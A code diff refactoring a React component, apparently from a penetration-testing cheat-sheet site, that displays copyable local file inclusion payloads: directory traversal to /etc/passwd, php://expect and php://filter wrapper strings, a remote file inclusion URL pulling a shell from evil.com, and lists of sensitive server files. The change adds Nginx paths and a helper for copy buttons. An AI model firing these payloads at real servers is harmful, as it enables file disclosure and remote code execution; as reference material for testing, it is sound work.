@@ -1,22 +1,27 @@
 import React from 'react';
+import type { ReactElement } from 'react';
 import { Button, message, Typography, Divider } from 'antd';
 import { CopyOutlined, LinkOutlined } from '@ant-design/icons';
 import Clipboard from 'react-clipboard.js';
 
 const { Title, Paragraph, Text } = Typography;
 
+const successInfoCopy = () => {
+    message.success( 'Your payload has been copied successfully!' );
+};
+
+const successInfoEncodeURL = () => {
+    message.success( 'Your payload URL encoded has been copied successfully!' );
+};
+
 export default function LFI () {
-    const successInfoReverseShell = () => {
-        message.success( 'Your payload has been copied successfully !' );
-    };
-
-    const successInfoEncodeURL = () => {
-        message.success( 'Your payload URL encoded has been copied successfully !' );
-    };
-
     const directoryTraversal = `foo.php?file=../../../../../../../etc/passwd`;
-    const phpWrapperLfi = `/example1.php?page=expect://ls`;
+    const phpWrapperExpect = `/example1.php?page=expect://ls`;
     const phpWrapperFilter = `/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd`;
+    const phpWrapperFiltersManual = [
+        { name: 'String Filters', url: 'https://www.php.net/manual/en/filters.string.php' },
+        { name: 'Conversion Filters', url: 'https://www.php.net/manual/en/filters.convert.php' }
+    ]
     const phpRfi = `http://example.com/index.php?page=http://evil.com/shell.txt`;
     const linux = [
         { title: '/etc/passwd' },
@@ -50,6 +55,13 @@ export default function LFI () {
         { title: '/var/log/apache2/access.log' },
         { title: '/var/log/apache/error.log' }
     ];
+    const nginx = [
+        { title: '/etc/nginx/nginx.conf' },
+        { title: '/usr/local/nginx/conf/nginx.conf' },
+        { title: '/usr/local/etc/nginx/nginx.conf' },
+        { title: '/var/log/nginx/access.log' },
+        { title: '/var/log/nginx/error.log' },
+    ];
     const mysql = [
         { title: '/var/lib/mysql/mysql/user.frm' },
         { title: '/var/lib/mysql/mysql/user.MYD' },
@@ -67,184 +79,111 @@ export default function LFI () {
     ];
 
     return (
-        <div>
-            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
+        <div style={{ margin: 15 }}>
+            <Title level={2} style={{ fontWeight: 'bold' }}>
                 LFI
             </Title>
-            <Paragraph style={{ margin: 15 }}>
-                LFI stands for Local File Includes - it's a file local inclusion vulnerability that allows an attacker
+            <Paragraph>
+                LFI stands for Local File Includes - it's a file local
+                inclusion vulnerability that allows an attacker
                 to include files that exist on the target web server.
             </Paragraph>
-            <Paragraph style={{ marginLeft: 15 }}>
-                Typically this is exploited by abusing dynamic file inclusion mechanisms that don't sanitize user input.
+            <Paragraph>
+                Typically this is exploited by abusing dynamic file inclusion
+                mechanisms that don't sanitize user input.
             </Paragraph>
-            <Divider dashed />
-            <div style={{ padding: 10, marginTop: 15 }} key='a'>
+            <div key='a'>
                 <Title level={3}>Directory traversal</Title>
                 <Paragraph ellipsis={true}>
                     <pre><Text copyable>{directoryTraversal}</Text></pre>
                 </Paragraph>
-                <Clipboard component='a' data-clipboard-text={directoryTraversal}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined /> Copy the payload
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( directoryTraversal )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
+                {copyButton(directoryTraversal)}
             </div>
             <Divider dashed />
-            <div
-                key='b'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
-                <Title level={3}>PHP Wrapper php://file</Title>
-                <Paragraph ellipsis={true}>
-                    <pre><Text copyable>{phpWrapperLfi}</Text></pre>
+            <div key='b'>
+                <Title level={3}>PHP php://expect Wrapper RCE</Title>
+                <Paragraph>
+                    <b>Note: This wrapper is not enabled by default.</b>
                 </Paragraph>
-                <Clipboard component='a' data-clipboard-text={phpWrapperLfi}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the payload
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( phpWrapperLfi )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
+                <Paragraph ellipsis={true}>
+                    <pre><Text copyable>{phpWrapperExpect}</Text></pre>
+                </Paragraph>
+                {copyButton(phpWrapperExpect)}
             </div>
             <Divider dashed />
-            <div
-                key='c'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
+            <div key='c'>
                 <Title level={3}>PHP Wrapper php://filter</Title>
+                <Paragraph>
+                    You can find other filters in PHP manual:
+                </Paragraph>
+                <ul>
+                    {phpWrapperFiltersManual.map((k, i) => {
+                        return <li key={i}>
+                            <a href={k.url} target="_blank">{k.name}</a>
+                        </li>
+                    })}
+                </ul>
                 <Paragraph ellipsis={true}>
                     <pre><Text copyable>{phpWrapperFilter}</Text></pre>
                 </Paragraph>
-                <Clipboard component='a' data-clipboard-text={phpWrapperFilter}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the payload
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( phpWrapperFilter )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
+                {copyButton(phpWrapperFilter)}
             </div>
             <Divider dashed />
-            <div
-                key='d'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
-                <Title level={3}>PHP Wrapper php://filter</Title>
+            <div key='d'>
+                <Title level={3}>PHP Remote File Inclusion (RFI)</Title>
+                <Paragraph>
+                    Remote file inclusion in PHP is a vulnerability that allows an
+                    attacker to execute arbitrary PHP code by including a remote
+                    file located on a server controlled by the attacker.
+                </Paragraph>
                 <Paragraph ellipsis={true}>
                     <pre><Text copyable>{phpRfi}</Text></pre>
                 </Paragraph>
-                <Clipboard component='a' data-clipboard-text={phpRfi}>
-                    <Button
-                        type='primary'
-                        onClick={successInfoReverseShell}
-                        style={{ marginBottom: 10, marginTop: 15 }}
-                    >
-                        <CopyOutlined />
-                        Copy the payload
-                    </Button>
-                </Clipboard>
-                <Clipboard component='a' data-clipboard-text={encodeURI( phpRfi )}>
-                    <Button
-                        type='dashed'
-                        onClick={successInfoEncodeURL}
-                        style={{ marginBottom: 10, marginTop: 15, marginLeft: 15 }}
-                    >
-                        <LinkOutlined /> URL encoded
-                    </Button>
-                </Clipboard>
+                {copyButton(phpRfi)}
             </div>
             <Divider dashed />
-            <div
-                key='e'
-                style={{
-                    padding: 15,
-                    marginTop: 15
-                }}
-            >
+            <div key='e'>
                 <Title level={3}>Useful LFI files</Title>
                 <Title level={4}>Linux</Title>
-                {linux.map( ( k, i ) => {
-                    return (
-                        <Paragraph key={i}>
-                            <pre><Text copyable>{k.title}</Text></pre>
-                        </Paragraph>
-                    );
-                } )}
+                {mapFileEntries(linux)}
                 <Divider dashed />
                 <Title level={4}>Apache</Title>
-                {apache.map( ( k, i ) => {
-                    return (
-                        <Paragraph key={i}>
-                            <pre><Text copyable>{k.title}</Text></pre>
-                        </Paragraph>
-                    );
-                } )}
+                {mapFileEntries(apache)}
+                <Divider dashed />
+                <Title level={4}>Nginx</Title>
+                {mapFileEntries(nginx)}
                 <Divider dashed />
                 <Title level={4}>MySQL</Title>
-                {mysql.map( ( k, i ) => {
-                    return (
-                        <Paragraph key={i}>
-                            <pre><Text copyable>{k.title}</Text></pre>
-                        </Paragraph>
-                    );
-                } )}
+                {mapFileEntries(mysql)}
                 <Divider dashed />
                 <Title level={4}>Windows</Title>
-                {windows.map( ( k, i ) => {
-                    return (
-                        <Paragraph key={i}>
-                            <pre><Text copyable>{k.title}</Text></pre>
-                        </Paragraph>
-                    );
-                } )}
+                {mapFileEntries(windows)}
             </div>
-            <Divider dashed />
         </div>
     );
 };
+
+function mapFileEntries(arr: {title: string}[]): ReactElement<typeof Paragraph>[]  {
+    return arr.map((k, i) => {
+        return (
+            <Paragraph key={i}>
+                <pre><Text copyable>{k.title}</Text></pre>
+            </Paragraph>
+        );
+    })
+}
+
+function copyButton(clipboardData: string): ReactElement {
+    return <>
+        <Clipboard component='a' data-clipboard-text={clipboardData}>
+            <Button type='primary' onClick={successInfoCopy} style={{ marginRight: 15 }}>
+                <CopyOutlined /> Copy the payload
+            </Button>
+        </Clipboard>
+        <Clipboard component='a' data-clipboard-text={encodeURI(clipboardData)}>
+            <Button type='dashed' onClick={successInfoEncodeURL}>
+                <LinkOutlined /> URL encoded
+            </Button>
+        </Clipboard>
+    </>
+}
